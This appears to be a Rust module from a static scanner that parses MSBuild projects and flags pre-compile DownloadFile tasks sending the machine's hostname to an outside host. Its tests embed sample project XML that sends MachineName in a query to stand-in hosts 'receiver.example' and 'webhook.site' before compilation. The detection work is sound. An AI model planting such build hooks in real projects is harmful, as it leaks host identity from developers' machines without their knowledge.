//! Bounded, non-executing MSBuild property provenance for DownloadFile tasks.
//! Only known literal/property values and the MachineName property function
//! are expanded. Unknown inputs stay opaque; no environment is read.
use std::collections::HashMap;

use crate::output::Values;
use crate::value_key;

#[derive(Clone, Debug)]
enum Part {
    Text(String),
    Hostname,
    Unknown,
}
type Properties = HashMap<String, Vec<Part>>;

fn expand(input: &str, properties: &Properties) -> Vec<Part> {
    if input.len() > 8192 {
        return vec![Part::Unknown];
    }
    let mut result = Vec::new();
    let mut remaining = input;
    while let Some(start) = remaining.find("$(") {
        result.push(Part::Text(remaining[..start].to_owned()));
        remaining = &remaining[start..];
        let Some(end) = remaining.find(')') else {
            result.push(Part::Unknown);
            remaining = "";
            break;
        };
        let expression: String = remaining[..=end]
            .chars()
            .filter(|c| !c.is_ascii_whitespace())
            .collect();
        if expression == "$([System.Environment]::MachineName)" {
            result.push(Part::Hostname);
            remaining = &remaining[end + 1..];
        } else {
            let name = remaining[2..end].to_ascii_lowercase();
            result.extend(
                properties
                    .get(&name)
                    .cloned()
                    .unwrap_or_else(|| vec![Part::Unknown]),
            );
            remaining = &remaining[end + 1..];
        }
        if result.len() > 64
            || result
                .iter()
                .map(|p| if let Part::Text(t) = p { t.len() } else { 0 })
                .sum::<usize>()
                > 8192
        {
            return vec![Part::Unknown];
        }
    }
    result.push(Part::Text(remaining.to_owned()));
    result
}

fn properties(group: roxmltree::Node<'_, '_>, map: &mut Properties) {
    let nodes: Vec<_> = group
        .children()
        .filter(roxmltree::Node::is_element)
        .take(129)
        .collect();
    if nodes.len() > 128 {
        // An unvisited later assignment could overwrite a proven input.
        map.clear();
        return;
    }
    for node in nodes {
        let value =
            if node.attribute("Condition").is_some() || group.attribute("Condition").is_some() {
                vec![Part::Unknown]
            } else {
                expand(node.text().unwrap_or(""), map)
            };
        if map.len() < 128 || map.contains_key(&node.tag_name().name().to_ascii_lowercase()) {
            map.insert(node.tag_name().name().to_ascii_lowercase(), value);
        }
    }
}

fn hostname_query_authority(parts: &[Part]) -> Option<String> {
    let mut prefix = String::new();
    for part in parts {
        match part {
            Part::Text(text) => prefix.push_str(text),
            Part::Unknown => return None,
            Part::Hostname => {
                let (scheme, rest) = prefix.split_once("://")?;
                if !scheme.eq_ignore_ascii_case("http") && !scheme.eq_ignore_ascii_case("https") {
                    return None;
                }
                let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
                if authority_end == 0 {
                    return None;
                }
                let query = rest.find('?')?;
                if rest[..query].contains('#') || rest[query..].contains('#') {
                    return None;
                }
                let field = rest[query + 1..].rsplit('&').next().unwrap_or("");
                return field
                    .contains('=')
                    .then(|| rest[..authority_end].to_ascii_lowercase());
            }
        }
        if prefix.len() > 8192 {
            return None;
        }
    }
    None
}

pub(super) fn extract(bytes: &[u8], values: &mut Values) {
    if bytes.len() > 8 * 1024 * 1024 {
        return;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return;
    };
    let text = text.trim_start_matches('\u{feff}');
    let options = roxmltree::ParsingOptions {
        nodes_limit: 100_000,
        ..Default::default()
    };
    let Ok(doc) = roxmltree::Document::parse_with_options(text, options) else {
        return;
    };
    let project = doc.root_element();
    if !project.has_tag_name("Project") {
        return;
    }
    let mut globals = Properties::new();
    for group in project
        .children()
        .filter(|n| n.has_tag_name("PropertyGroup"))
    {
        properties(group, &mut globals);
    }
    let mut downloads = Vec::new();
    for target in project
        .children()
        .filter(|n| n.has_tag_name("Target"))
        .take(256)
    {
        if target
            .attribute("Condition")
            .is_some_and(|c| c.trim().eq_ignore_ascii_case("false"))
        {
            continue;
        }
        let before: Vec<_> = target
            .attribute("BeforeTargets")
            .unwrap_or("")
            .split(';')
            .map(str::trim)
            .filter(|v| !v.is_empty())
            .collect();
        let precompile = before.iter().any(|v| {
            ["Build", "CoreCompile", "ResolveAssemblyReferences"]
                .iter()
                .any(|phase| v.eq_ignore_ascii_case(phase))
        });
        let mut local = globals.clone();
        for node in target.children().filter(roxmltree::Node::is_element) {
            if node.has_tag_name("PropertyGroup") {
                properties(node, &mut local);
            } else if node.has_tag_name("DownloadFile") && downloads.len() < 256 {
                if node
                    .attribute("Condition")
                    .is_some_and(|c| c.trim().eq_ignore_ascii_case("false"))
                {
                    continue;
                }
                let source = node.attribute("SourceUrl").unwrap_or("");
                let authority = precompile
                    .then(|| hostname_query_authority(&expand(source, &local)))
                    .flatten();
                downloads.push(serde_json::json!({
                    "target": target.attribute("Name").unwrap_or(""),
                    "before_targets": before,
                    "source_url": source,
                    "precompile_hostname_query": authority.is_some(),
                    "precompile_hostname_query_authority": authority,
                }));
            }
        }
    }
    if !downloads.is_empty() {
        values.insert_key(
            value_key!("msbuild.downloads"),
            serde_json::json!(downloads),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    fn matches(xml: &str) -> bool {
        let mut values = Values::new();
        extract(xml.as_bytes(), &mut values);
        values
            .get("msbuild.downloads")
            .and_then(serde_json::Value::as_array)
            .is_some_and(|rows| rows.iter().any(|r| r["precompile_hostname_query"] == true))
    }
    const BODY: &str = r#"<Project><Target BeforeTargets="CoreCompile;Build"><PropertyGroup><Device>$([System.Environment]::MachineName)</Device><Endpoint>https://receiver.example/?id=$(Device)</Endpoint></PropertyGroup><DownloadFile SourceUrl="$(Endpoint)"/></Target></Project>"#;
    #[test]
    fn aliases_and_namespaces() {
        assert!(matches(BODY));
        assert!(matches(
            &BODY
                .replace("Device", "RENAMED")
                .replace("$(RENAMED)", "$(renamed)")
                .replace(
                    "<Project>",
                    "<Project xmlns='http://schemas.microsoft.com/developer/msbuild/2003'>"
                )
        ));
    }
    #[test]
    fn inline_and_root_properties() {
        assert!(matches(
            r#"<Project><PropertyGroup><H>$([System.Environment]::MachineName)</H></PropertyGroup><Target BeforeTargets="Build"><DownloadFile SourceUrl="https://receiver.example/?host=$(H)"/></Target></Project>"#
        ));
    }
    #[test]
    fn unknown_after_disclosed_value_is_not_before_it() {
        assert!(matches(
            &BODY.replace("?id=$(Device)", "?id=$(Device)&amp;pod=$(Unknown)")
        ));
        assert!(!matches(&BODY.replace(
            "?id=$(Device)",
            "?prefix=$(Unknown)&amp;id=$(Device)"
        )));
    }
    #[test]
    fn ignores_comments_and_inert_xml() {
        assert!(!matches(&format!("<!-- {BODY} -->")));
        assert!(!matches(
            &BODY
                .replace("<Device>", "<!--<Device>")
                .replace("</Device>", "</Device>-->")
        ));
        assert!(!matches(&BODY.replace("Project", "Documentation")));
    }
    #[test]
    fn requires_actual_download_and_hook() {
        assert!(!matches(&BODY.replace("DownloadFile", "Message")));
        assert!(!matches(&BODY.replace("CoreCompile;Build", "Manual")));
        assert!(!matches(
            &BODY.replace("$(Endpoint)", "https://receiver.example/static")
        ));
    }
    #[test]
    fn excludes_path_fragment_and_opaque_inputs() {
        assert!(!matches(&BODY.replace("?id=", "path/")));
        assert!(!matches(&BODY.replace("?id=", "#?id=")));
        assert!(!matches(
            &BODY.replace("<Device>", "<Device Condition='unknown'>")
        ));
        assert!(!matches(&BODY.replace("$(Device)", "$(Unknown)")));
    }
    #[test]
    fn target_scope_and_overwrites() {
        assert!(!matches(&BODY.replace(
            "<DownloadFile",
            "</Target><Target BeforeTargets='Manual'><DownloadFile"
        )));
        assert!(!matches(
            &BODY.replace("<Endpoint>", "<Device>constant</Device><Endpoint>")
        ));
        assert!(!matches(
            &BODY.replace("<Target ", "<Target Condition='false' ")
        ));
    }
    #[test]
    fn flexible_phase_and_function_spacing() {
        assert!(matches(
            &BODY
                .replace("CoreCompile;Build", "corecompile;build")
                .replace(
                    "[System.Environment]::MachineName",
                    " [System.Environment] :: MachineName "
                )
                .replace("https://", "HTTPS://")
        ));
    }
    #[test]
    fn destination_is_bound_to_the_callback() {
        let mut values = Values::new();
        extract(
            BODY.replace("receiver.example", "webhook.site").as_bytes(),
            &mut values,
        );
        assert_eq!(
            values
                .get("msbuild.downloads[0].precompile_hostname_query_authority")
                .and_then(serde_json::Value::as_str),
            Some("webhook.site")
        );
        extract(
            BODY.replace(
                "</Project>",
                "<PropertyGroup><Unused>https://webhook.site/</Unused></PropertyGroup></Project>",
            )
            .as_bytes(),
            &mut values,
        );
        assert_eq!(
            values
                .get("msbuild.downloads[0].precompile_hostname_query_authority")
                .and_then(serde_json::Value::as_str),
            Some("receiver.example")
        );
    }
    #[test]
    fn truncated_property_groups_do_not_preserve_stale_inputs() {
        let mut map = Properties::new();
        map.insert("device".to_owned(), vec![Part::Hostname]);
        let xml = format!(
            "<PropertyGroup>{}<Device>constant</Device></PropertyGroup>",
            "<Padding>x</Padding>".repeat(128)
        );
        let doc = roxmltree::Document::parse(&xml).unwrap();
        properties(doc.root_element(), &mut map);
        assert!(matches!(
            expand("$(Device)", &map).get(1),
            Some(Part::Unknown)
        ));
    }
}
